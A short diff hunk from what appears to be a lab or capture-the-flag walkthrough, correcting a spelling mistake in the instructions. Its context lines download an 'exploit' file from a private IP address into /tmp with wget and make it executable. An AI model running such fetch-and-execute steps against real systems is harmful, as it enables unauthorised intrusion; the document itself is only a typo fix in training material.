@@ -131,7 +131,7 @@ cd /tmp
 wget http://10.10.16.44/exploit
 ```
 
-Make sure to have execution perssion by:
+Make sure to have execution permission by:
 
 ```
 chmod +x exploit
